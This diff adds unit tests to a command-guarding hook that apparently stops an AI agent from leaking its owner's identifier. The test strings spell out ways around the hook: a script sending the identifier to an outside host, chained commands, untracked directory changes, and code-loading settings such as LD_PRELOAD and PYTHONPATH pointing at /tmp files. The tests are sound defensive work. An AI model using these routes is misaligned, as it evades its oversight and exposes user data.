@@ -142,6 +142,29 @@ class Refuses(unittest.TestCase):
             (Path(d) / "big.py").write_text("x = 1\n" * (g.MAX_SCRIPT_BYTES // 6 + 10))
             self.deny("python3 big.py %s" % ME, cwd=d)
 
+    def test_a_later_flag_on_another_command_does_not_hide_the_script(self):
+        with tempfile.TemporaryDirectory() as d:
+            (Path(d) / "probe.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
+            self.deny("python3 probe.py ; grep -e x file", cwd=d)
+            self.deny("python3 probe.py && sed -e s/a/b/ file", cwd=d)
+            self.deny("python3 -W ignore probe.py ; echo -c", cwd=d)
+
+    def test_a_missing_script_is_not_hidden_by_a_mail_tool_beside_it(self):
+        self.deny("python3 /nowhere/probe.py %s/gmail_api.py %s" % (TOOLS, ME))
+        self.deny("python3 ./made-later.py %s/calendar_api.py %s" % (TOOLS, ME))
+
+    def test_a_folder_change_the_hook_cannot_follow_is_not_assumed_safe(self):
+        for cmd in ("pushd sub && python3 gmail_api.py --to %s", "cd - && python3 gmail_api.py --to %s",
+                    "cd $WORK && python3 gmail_api.py --to %s", "cd `pwd`/sub && python3 gmail_api.py --to %s"):
+            with self.subTest(cmd=cmd):
+                self.deny(cmd % ME)
+
+    def test_a_mail_tool_is_not_trusted_beside_settings_that_load_other_code(self):
+        for pre in ("PYTHONPATH=/tmp/evil ", "PYTHONSTARTUP=/tmp/x.py ", "NODE_OPTIONS=--require=/tmp/x.js ", "LD_PRELOAD=/tmp/x.so ",
+                    "env PYTHONPATH=/tmp/evil ", "env -i "):
+            with self.subTest(pre=pre):
+                self.deny("%spython3 %s/gmail_api.py draft-create --to %s" % (pre, TOOLS, ME))
+
     def test_webfetch_and_websearch(self):
         for url in ("https://example.com/?e=%s" % ME, "https://example.com/?e=owner.name%40example.org", "https://example.com/" + ME):
             with self.subTest(url=url):
